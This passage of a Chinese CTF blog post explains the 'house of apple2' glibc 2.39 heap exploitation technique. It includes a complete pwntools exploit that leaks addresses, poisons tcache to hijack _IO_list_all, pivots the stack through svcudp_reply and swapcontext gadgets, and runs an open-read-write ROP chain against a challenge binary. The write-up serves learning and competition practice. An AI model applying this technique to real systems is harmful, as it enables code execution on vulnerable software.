+<h3 id="2-39下的house-of-apple2-orw"><a href="#2-39下的house-of-apple2-orw" class="headerlink" title="2.39下的house of apple2(orw)"></a>2.39下的<em>house of apple2(orw)</em></h3><p>自从<em>secontext</em>中设置rsp的寄存器从rdi变成了rdx,利用难度就上了一个level  <em>&#x2F;(QwQ)&#x2F;~~</em></p>
+<ul>
+<li>参考文章: <a target="_blank" rel="noopener" href="https://blogyoulin.top/2024/05/30/house-of-apple2-GLIBC2-39/">基于house-of-apple2的GLIBC2.39利用</a></li>
+<li>可使用例题: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1RSG3yPuj0dbdjHMSWK9hHQ">xyctf_2025_heap2</a></li>
+</ul>
+<p>可使用的magic_gadget与函数:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">svcudp_reply</span><br><span class="line">swapcontext</span><br></pre></td></tr></table></figure>
+
+<p>其中svcudp_reply不是导出符号,可以通过ROPgadget的opcode在libc中定位</p>
+<p><code>ROPgadget --binary ./libc.so --opcode 4c8b6748</code></p>
+<p><img src="/images/666/08.png" alt="08"></p>
+<p>swap</p>
+<p><img src="/images/666/09.png" alt="09"></p>
+<p><img src="/images/666/10.png" alt="10"></p>
+<ul>
+<li>可以通过rdi控制rax,r12</li>
+<li>rax可以控制执行流到swapcontext,r12控制栈地址(rsp),rcx控制执行流到”栈”(迁移后的位置)上的ROP</li>
+<li>其实<code>fldenv bytes ptr [rcx]</code>要求rcx不能为null,如果刚刚好与ROP中的p64(0)撞到的话,在ROP中垫几个ret滑块指令就能绕过</li>
+<li>后半段swapcontext会push rcx….ret,所以我们要第二次在rcx里设置好对应的ROP地址使得跳转成功</li>
+</ul>
+<h6 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py:"></a><em><strong>exp.py:</strong></em></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">Id</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(Id).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload=<span class="string">b&#x27;\x00&#x27;</span></span>):</span><br><span class="line">    ch(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;data: &quot;</span>,payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">Id</span>):</span><br><span class="line">    ch(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>,<span class="built_in">str</span>(Id).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">Id</span>):</span><br><span class="line">    ch(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx: &quot;</span>,<span class="built_in">str</span>(Id).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x250</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):<span class="comment">#3-10</span></span><br><span class="line">    add(<span class="number">0x250</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x203b20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;base=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&quot;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x14c10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;heap=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)<span class="comment">#4-5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]:</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x250</span>)<span class="comment">#11</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">key=(heap+<span class="number">0x15d60</span>)&gt;&gt;<span class="number">12</span></span><br><span class="line">_IO_list_all=base+libc.sym._IO_list_all</span><br><span class="line">_IO_wfile_jumps=base+libc.sym._IO_wfile_jumps</span><br><span class="line">add(<span class="number">0x300</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x250</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x261</span>)+p64(key^_IO_list_all))</span><br><span class="line">add(<span class="number">0x250</span>)<span class="comment">#12</span></span><br><span class="line">wide=heap+<span class="number">0x15380</span>+<span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x250</span>,p64(wide))<span class="comment">#13</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;_IO_list_all=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(_IO_list_all)&#125;</span>&quot;</span>)</span><br><span class="line">magic=base+<span class="number">0x17923D</span></span><br><span class="line">setcontext=base+<span class="number">0x5814D</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;svcudp_reply=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(magic)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;swapcontext=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(setcontext)&#125;</span>&quot;</span>)</span><br><span class="line">rdi=base+<span class="number">0x000000000010f75b</span></span><br><span class="line">rsi=base+<span class="number">0x0000000000110a4d</span></span><br><span class="line">rdx=base+<span class="number">0x00000000000b0123</span><span class="comment">#mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret</span></span><br><span class="line">rbx=base+<span class="number">0x00000000000586d4</span></span><br><span class="line">ope=base+libc.sym.<span class="built_in">open</span></span><br><span class="line">read=base+libc.sym.read</span><br><span class="line">write=base+libc.sym.write</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;wide=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(wide)&#125;</span>&quot;</span>)</span><br><span class="line">fake=flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>:&#123;</span><br><span class="line">        <span class="number">0x00</span>:p64(<span class="number">0</span>),</span><br><span class="line">        <span class="number">0x28</span>:p64(<span class="number">1</span>),</span><br><span class="line">        <span class="number">0x48</span>:p64(wide+<span class="number">0x200</span>-<span class="number">0xa0</span>),</span><br><span class="line">        <span class="number">0x68</span>:p64(magic),</span><br><span class="line">        <span class="number">0x88</span>:p64(heap+<span class="number">0x200</span>),</span><br><span class="line">        <span class="number">0xa0</span>:p64(wide),</span><br><span class="line">        <span class="number">0xd8</span>:p64(_IO_wfile_jumps),</span><br><span class="line">        <span class="number">0xe0</span>:p64(wide)</span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="number">0x160</span>:&#123;</span><br><span class="line">        <span class="number">0x10</span>:p64(heap+<span class="number">0x100</span>),</span><br><span class="line">        <span class="number">0x18</span>:p64(wide+<span class="number">0x160</span>),</span><br><span class="line">        <span class="number">0x28</span>:p64(setcontext)</span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="number">0x200</span>:[</span><br><span class="line">        p64(wide+<span class="number">0x208</span>),</span><br><span class="line">        p64(rdi+<span class="number">1</span>)*<span class="number">8</span>,</span><br><span class="line">        p64(rdi),</span><br><span class="line">        p64(wide+<span class="number">0x400</span>),</span><br><span class="line">        p64(rsi),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(rbx),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(rdx),</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">3</span>,</span><br><span class="line">        p64(ope),</span><br><span class="line">        p64(rdi),</span><br><span class="line">        p64(<span class="number">3</span>),</span><br><span class="line">        p64(rsi),</span><br><span class="line">        p64(heap+<span class="number">0x1000</span>),</span><br><span class="line">        p64(rbx),</span><br><span class="line">        p64(<span class="number">0x60</span>),</span><br><span class="line">        p64(rdx),</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">3</span>,</span><br><span class="line">        p64(read),</span><br><span class="line">        p64(rdi),</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(write)</span><br><span class="line">        ],</span><br><span class="line">    <span class="number">0x400</span>:<span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,fake)</span><br><span class="line">bug()</span><br><span class="line">ch(<span class="number">4</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/covers/er.jpg" data-sizes="auto" alt="io_uring" class="lazyload">
+          
+        
+        <a href="/2025/04/28/io_uring/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            io_uring
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/er.jpg" data-sizes="auto" alt="Magic_gadget" class="lazyload">
+        
+      
+      <a href="/2025/04/15/magic/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          Magic_gadget
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        5.2k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        00:21
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="toc-number">1.</span> <span class="toc-text">奇奇怪怪的技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-execv%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">1.execv调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BE%A7%E4%BF%A1%E9%81%93%E7%9A%84%E4%BD%BF%E7%94%A8%F0%9F%A4%94"><span class="toc-number">1.2.</span> <span class="toc-text">2.侧信道的使用🤔</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-shellcode%E5%86%99%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 shellcode写法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.0.1.</span> <span class="toc-text">原理:</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.1.0.2.</span> <span class="toc-text">核心指令:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-rop%E7%9A%84%E5%86%99%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 rop的写法:</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.2.2.0.1.</span> <span class="toc-text">原理:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-gdb%E4%BD%BF%E7%94%A8-sendfile"><span class="toc-number">1.3.</span> <span class="toc-text">3.gdb使用&amp;sendfile</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3-1-gdb%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.0.0.1.</span> <span class="toc-text">3.1 gdb调试:</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-2-sendfile"><span class="toc-number">1.3.0.0.2.</span> <span class="toc-text">3.2 sendfile:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%A1%A8"><span class="toc-number">1.4.</span> <span class="toc-text">4.随机数表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-c-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text">5.c++异常处理机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-39%E4%B8%8B%E7%9A%84house-of-apple2-orw"><span class="toc-number">1.6.</span> <span class="toc-text">2.39下的house of apple2(orw)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exp-py"><span class="toc-number">1.6.0.0.1.</span> <span class="toc-text">exp.py:</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "something_interesting",
+          url: "https://khighl.github.io.git/2025/04/15/01/",
+          excerpt: "",
+          description: "",
+          stripContent: "奇奇怪怪的技巧前言:  主播最近打了一些比赛,遇到了不少奇奇怪怪的手法,不过好在几乎都有惊无险地打过去了 主播还是没能学会ret2dlresolve,不知道ret2dlresolve的博客什么时候才能发出来  :( 部分题目因为供题人的要求不能发出附件 :( 不好意思  1.execv调用 此处可以布置一个ROP,没有沙箱可以直接获取shell 我在之前进行了多次栈迁移(迁移到bss上),导致无法调用system(“&amp;#x2F;bin&amp;#x2F;sh”) 1system(&amp;quot;/bin/s",
+          date: "Tue Apr 15 2025 17:49:32 GMT+0800",
+          updated: "Tue Apr 29 2025 10:50:52 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
